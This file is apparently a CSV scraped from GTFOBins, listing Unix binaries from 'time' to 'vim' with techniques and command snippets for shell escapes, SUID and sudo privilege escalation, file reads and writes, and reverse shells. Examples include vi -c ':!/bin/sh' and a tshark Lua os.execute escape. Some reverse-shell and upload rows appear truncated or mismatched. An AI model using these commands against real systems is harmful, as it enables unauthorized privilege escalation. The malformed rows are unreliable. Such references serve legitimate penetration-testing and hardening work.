time,Shell,https://gtfobins.github.io/gtfobins/time/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,/usr/bin/time /bin/sh
time,SUID,https://gtfobins.github.io/gtfobins/time/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
time,Sudo,https://gtfobins.github.io/gtfobins/time/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
timedatectl,Shell,https://gtfobins.github.io/gtfobins/timedatectl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"timedatectl list-timezones
!/bin/sh"
timedatectl,Sudo,https://gtfobins.github.io/gtfobins/timedatectl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
timeout,Shell,https://gtfobins.github.io/gtfobins/timeout/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,timeout 7d /bin/sh
timeout,SUID,https://gtfobins.github.io/gtfobins/timeout/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
timeout,Sudo,https://gtfobins.github.io/gtfobins/timeout/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tmate,Shell,https://gtfobins.github.io/gtfobins/tmate/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tmate -c /bin/sh
tmate,Sudo,https://gtfobins.github.io/gtfobins/tmate/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tmate,Limited SUID,https://gtfobins.github.io/gtfobins/tmate/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tmux,Shell,https://gtfobins.github.io/gtfobins/tmux/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tmux
tmux,File read,https://gtfobins.github.io/gtfobins/tmux/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",tmux
tmux,Sudo,https://gtfobins.github.io/gtfobins/tmux/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
top,Shell,https://gtfobins.github.io/gtfobins/top/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset"
top,Sudo,https://gtfobins.github.io/gtfobins/top/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
torify,Shell,https://gtfobins.github.io/gtfobins/torify/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,torify /bin/sh
torify,Sudo,https://gtfobins.github.io/gtfobins/torify/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
torsocks,Shell,https://gtfobins.github.io/gtfobins/torsocks/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,torsocks /bin/sh
torsocks,Sudo,https://gtfobins.github.io/gtfobins/torsocks/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
troff,File read,https://gtfobins.github.io/gtfobins/troff/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
troff $LFILE"
troff,SUID,https://gtfobins.github.io/gtfobins/troff/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
troff,Sudo,https://gtfobins.github.io/gtfobins/troff/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tshark,Shell,https://gtfobins.github.io/gtfobins/tshark/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF"
ul,File read,https://gtfobins.github.io/gtfobins/ul/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ul ""$LFILE"""
ul,SUID,https://gtfobins.github.io/gtfobins/ul/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ul,Sudo,https://gtfobins.github.io/gtfobins/ul/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
unexpand,File read,https://gtfobins.github.io/gtfobins/unexpand/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
unexpand -t99999999 ""$LFILE"""
unexpand,SUID,https://gtfobins.github.io/gtfobins/unexpand/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
unexpand,Sudo,https://gtfobins.github.io/gtfobins/unexpand/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
uniq,File read,https://gtfobins.github.io/gtfobins/uniq/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
uniq ""$LFILE"""
uniq,SUID,https://gtfobins.github.io/gtfobins/uniq/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
uniq,Sudo,https://gtfobins.github.io/gtfobins/uniq/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
unshare,Shell,https://gtfobins.github.io/gtfobins/unshare/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,unshare /bin/sh
unshare,SUID,https://gtfobins.github.io/gtfobins/unshare/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
unshare,Sudo,https://gtfobins.github.io/gtfobins/unshare/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
unsquashfs,SUID,https://gtfobins.github.io/gtfobins/unsquashfs/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
unsquashfs,Sudo,https://gtfobins.github.io/gtfobins/unsquashfs/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
unzip,SUID,https://gtfobins.github.io/gtfobins/unzip/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
unzip,Sudo,https://gtfobins.github.io/gtfobins/unzip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
update-alternatives,SUID,https://gtfobins.github.io/gtfobins/update-alternatives/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
update-alternatives,Sudo,https://gtfobins.github.io/gtfobins/update-alternatives/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
uudecode,File read,https://gtfobins.github.io/gtfobins/uudecode/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode"
uudecode,SUID,https://gtfobins.github.io/gtfobins/uudecode/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
uudecode,Sudo,https://gtfobins.github.io/gtfobins/uudecode/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
uuencode,File read,https://gtfobins.github.io/gtfobins/uuencode/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode"
uuencode,SUID,https://gtfobins.github.io/gtfobins/uuencode/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
uuencode,Sudo,https://gtfobins.github.io/gtfobins/uuencode/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
vagrant,Shell,https://gtfobins.github.io/gtfobins/vagrant/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up"
vagrant,SUID,https://gtfobins.github.io/gtfobins/vagrant/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
vagrant,Sudo,https://gtfobins.github.io/gtfobins/vagrant/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
valgrind,Shell,https://gtfobins.github.io/gtfobins/valgrind/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,valgrind /bin/sh
valgrind,Sudo,https://gtfobins.github.io/gtfobins/valgrind/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
varnishncsa,SUID,https://gtfobins.github.io/gtfobins/varnishncsa/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
varnishncsa,Sudo,https://gtfobins.github.io/gtfobins/varnishncsa/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
vi,Shell,https://gtfobins.github.io/gtfobins/vi/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,vi -c ':!/bin/sh' /dev/null
vi,File write,https://gtfobins.github.io/gtfobins/vi/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","vi file_to_write
iDATA
^[
w"
vi,File read,https://gtfobins.github.io/gtfobins/vi/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",vi file_to_read
vi,Sudo,https://gtfobins.github.io/gtfobins/vi/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
view,Shell,https://gtfobins.github.io/gtfobins/view/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,view -c ':!/bin/sh'
view,Reverse shell,https://gtfobins.github.io/gtfobins/view/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,view
view,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/view/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
view,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/view/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
view,File upload,https://gtfobins.github.io/gtfobins/view/#file-upload,It can exfiltrate files on the network.,view
view,File download,https://gtfobins.github.io/gtfobins/view/#file-download,It can download remote files.,view
view,File write,https://gtfobins.github.io/gtfobins/view/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","view file_to_write
iDATA
^[
w!"
view,File read,https://gtfobins.github.io/gtfobins/view/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",view file_to_read
view,Library load,https://gtfobins.github.io/gtfobins/view/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,view
view,SUID,https://gtfobins.github.io/gtfobins/view/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
view,Sudo,https://gtfobins.github.io/gtfobins/view/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
view,Capabilities,https://gtfobins.github.io/gtfobins/view/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
view,Limited SUID,https://gtfobins.github.io/gtfobins/view/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
vigr,SUID,https://gtfobins.github.io/gtfobins/vigr/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
vigr,Sudo,https://gtfobins.github.io/gtfobins/vigr/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
vim,Shell,https://gtfobins.github.io/gtfobins/vim/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,vim -c ':!/bin/sh'
vim,Reverse shell,https://gtfobins.github.io/gtfobins/vim/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,vim
vim,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/vim/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
vim,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/vim/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
vim,File upload,https://gtfobins.github.io/gtfobins/vim/#file-upload,It can exfiltrate files on the network.,vim
vim,File download,https://gtfobins.github.io/gtfobins/vim/#file-download,It can download remote files.,vim
vim,File write,https://gtfobins.github.io/gtfobins/vim/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","vim file_to_write
iDATA
^[
w"
vim,File read,https://gtfobins.github.io/gtfobins/vim/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",vim file_to_read
vim,Library load,https://gtfobins.github.io/gtfobins/vim/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,vim
vim,SUID,https://gtfobins.github.io/gtfobins/vim/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
